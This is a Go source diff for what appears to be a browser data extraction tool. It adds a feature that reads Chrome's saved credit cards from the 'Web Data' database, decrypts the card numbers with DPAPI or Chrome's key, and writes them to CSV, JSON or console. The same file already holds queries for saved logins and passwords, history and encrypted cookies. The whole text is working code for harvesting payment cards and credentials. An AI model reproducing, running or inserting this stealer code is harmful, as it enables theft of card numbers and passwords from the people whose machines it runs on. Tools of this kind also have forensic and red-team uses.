@@ -36,6 +36,7 @@ type Item interface {
 }
 
 const (
+	ChromeCreditFile   = "Web Data"
 	ChromePasswordFile = "Login Data"
 	ChromeHistoryFile  = "History"
 	ChromeCookieFile   = "Cookies"
@@ -47,6 +48,7 @@ const (
 )
 
 var (
+	queryChromiumCredit   = `SELECT guid,name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards`
 	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
 	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
 	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
@@ -609,6 +611,90 @@ func (p *passwords) OutPut(format, browser, dir string) error {
 	}
 }
 
+type creditcards struct {
+	mainPath string
+	cards    map[string][]card
+}
+
+func NewCCards(main string, sub string) Item {
+	return &creditcards{mainPath: main}
+}
+
+func (credit *creditcards) FirefoxParse() error {
+	return nil // FireFox does not have a credit card saving feature
+}
+
+func (credit *creditcards) ChromeParse(secretKey []byte) error {
+	credit.cards = make(map[string][]card)
+	creditDB, err := sql.Open("sqlite3", ChromeCreditFile)
+	if err != nil {
+		return err
+	}
+	defer func() {
+		if err := creditDB.Close(); err != nil {
+			log.Debug(err)
+		}
+	}()
+	rows, err := creditDB.Query(queryChromiumCredit)
+	if err != nil {
+		return err
+	}
+	defer func() {
+		if err := rows.Close(); err != nil {
+			log.Debug(err)
+		}
+	}()
+	for rows.Next() {
+		var (
+			name, expirationm, expirationy, guid string
+			value, encryptValue                  []byte
+		)
+		err := rows.Scan(&guid, &name, &expirationm, &expirationy, &encryptValue)
+		if err != nil {
+			log.Error(err)
+		}
+		creditCardInfo := card{
+			GUID:            guid,
+			Name:            name,
+			ExpirationMonth: expirationm,
+			ExpirationYear:  expirationy,
+		}
+		if secretKey == nil {
+			value, err = decrypt.DPApi(encryptValue)
+		} else {
+			value, err = decrypt.ChromePass(secretKey, encryptValue)
+		}
+		if err != nil {
+			log.Debug(err)
+		}
+		creditCardInfo.Cardnumber = string(value)
+		credit.cards[guid] = append(credit.cards[guid], creditCardInfo)
+	}
+	return nil
+}
+
+func (credit *creditcards) CopyDB() error {
+	return copyToLocalPath(credit.mainPath, filepath.Base(credit.mainPath))
+}
+
+func (credit *creditcards) Release() error {
+	return os.Remove(filepath.Base(credit.mainPath))
+}
+
+func (credit *creditcards) OutPut(format, browser, dir string) error {
+	switch format {
+	case "csv":
+		err := credit.outPutCsv(browser, dir)
+		return err
+	case "console":
+		credit.outPutConsole()
+		return nil
+	default:
+		err := credit.outPutJson(browser, dir)
+		return err
+	}
+}
+
 // getFirefoxDecryptKey get value from key4.db
 func getFirefoxDecryptKey() (item1, item2, a11, a102 []byte, err error) {
 	var (
@@ -719,6 +805,13 @@ type (
 		Url           string
 		VisitCount    int
 		LastVisitTime time.Time
+	}
+	card struct {
+		GUID            string
+		Name            string
+		ExpirationMonth string
+		ExpirationYear  string
+		Cardnumber      string
 	}
 )
 
